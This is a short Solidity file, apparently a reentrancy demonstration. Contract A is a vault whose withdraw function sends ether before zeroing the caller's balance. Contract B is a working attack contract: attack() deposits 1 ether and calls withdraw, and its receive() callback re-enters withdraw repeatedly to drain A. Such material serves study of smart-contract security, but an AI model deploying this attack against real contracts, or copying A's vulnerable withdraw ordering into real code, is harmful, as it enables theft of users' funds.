// SPDX-License-Identifier: MIT
pragma solidity ^0.8.6;

contract A{
     
      mapping(address => uint) public balance;

      function deposite() public payable  {
        balance[msg.sender] += msg.value;
      }

      function withdraw() public {
        uint bal = balance[msg.sender];
        require(bal>0);
        (bool sent,)= msg.sender.call{value:bal}("");
        require(sent,"failure");
        balance[msg.sender] = 0;      

      }

      function getbalance() public view returns(uint){
        return address(this).balance;
        }



}


contract B{
    A public a;

    constructor(address _address){
        a = A(_address);
    }

    receive() external payable{
        if(address(a).balance>=1 ether){
            a.withdraw();
        }
    }

    function attack() external payable{
        require(msg.value >= 1 ether);
        a.deposite{value: 1 ether}();
        a.withdraw();
    }

    function getbalance() public view returns(uint){
        return address(this).balance;
    }


}